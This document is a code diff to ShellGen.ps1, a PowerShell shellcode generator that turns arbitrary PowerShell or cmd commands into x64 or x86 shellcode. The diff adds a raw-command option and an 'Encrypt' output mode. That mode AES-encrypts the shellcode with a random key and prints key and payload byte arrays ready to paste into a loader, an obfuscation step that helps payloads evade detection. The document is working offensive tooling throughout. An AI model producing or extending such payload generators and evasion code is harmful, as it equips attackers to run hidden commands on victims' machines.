@@ -1,12 +1,24 @@
 function ShellGen {
+
+    <#
+    	.SYNOPSIS
+    	ShellGen.ps1 | Author: Rob LP (@L3o4j)
+   	https://github.com/Leo4j/ShellGen
+	
+    	.DESCRIPTION
+    	Generate ShellCode in various formats
+    #>
+
     param (
         [string]$PwshCommand,
         [string]$B64PwshCommand,
         [string]$CmdCommand,
+        [string]$Command,
         [switch]$x64,
         [switch]$x86,
+		[switch]$Encrypt,
         [string]$OutputFilePath,
-		[string]$OutputFormat = "Raw"
+        [string]$OutputFormat = "Raw"
     )
     
     if($PwshCommand){
@@ -20,6 +32,10 @@ function ShellGen {
     
     elseif($CmdCommand){
         $ShCommand = "cmd /c $CmdCommand"
+    }
+
+    elseif($Command){
+        $ShCommand = "$Command"
     }
     
     if($x64){
@@ -165,7 +181,17 @@ function ShellGen {
 	$payloadSize = $shellcode.Length
     
     switch ($OutputFormat) {
-        "Raw" {
+        "Encrypt" {
+            $keyString = -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
+			$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($keyString)
+			$encryptedData = AESEncrypt -plainText $shellcode -Key $keyBytes
+			$formattedOutput = Format-ByteArray -byteArray $encryptedData
+			$formattedKey = Format-ByteArray -byteArray $keyBytes
+			Write-Output "AESkey[] = {$formattedKey}"
+			Write-Output "payload[] = {$formattedOutput}"
+			Write-Output ""
+        }
+		"Raw" {
             if (-not $OutputFilePath) {
                 $OutputFilePath = ".\payload.raw"
             }
@@ -234,7 +260,7 @@ function ShellGen {
             }
             Write-Output ""
         }
-	"csharp" {
+        "csharp" {
             $formattedShellcode = $shellcode | ForEach-Object { '0x' + $_.ToString('X2') }
             $lines = @()
             for ($i = 0; $i -lt $formattedShellcode.Length; $i += 15) {
@@ -333,4 +359,33 @@ function x86Command ([string] $command) {
     	$output += x86Encode-Command $chunk
     }
     return $output
+}
+
+function AESEncrypt {
+    param (
+        [byte[]]$plainText,  # The data to be encrypted
+        [byte[]]$Key         # The cleartext key
+    )
+
+    if ($Key.Length -ne 16 -and $Key.Length -ne 24 -and $Key.Length -ne 32) {
+        throw "Invalid key size. AES supports keys of 128, 192, or 256 bits."
+    }
+
+    $aesAlg = [System.Security.Cryptography.Aes]::Create()
+    $aesAlg.Key = [System.Security.Cryptography.SHA256]::Create().ComputeHash($Key) # Hash the key to match Python scripts if needed
+    $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesAlg.IV = [byte[]](0..15 | ForEach-Object { 0 })  # Fixed IV of 16 null bytes
+
+    $encryptor = $aesAlg.CreateEncryptor($aesAlg.Key, $aesAlg.IV)
+    return $encryptor.TransformFinalBlock($plainText, 0, $plainText.Length)
+}
+
+function Format-ByteArray {
+    param (
+        [byte[]]$byteArray
+    )
+
+    $formattedBytes = $byteArray | ForEach-Object { "0x{0:x2}" -f $_ }
+    return ($formattedBytes -join ", ")
 }
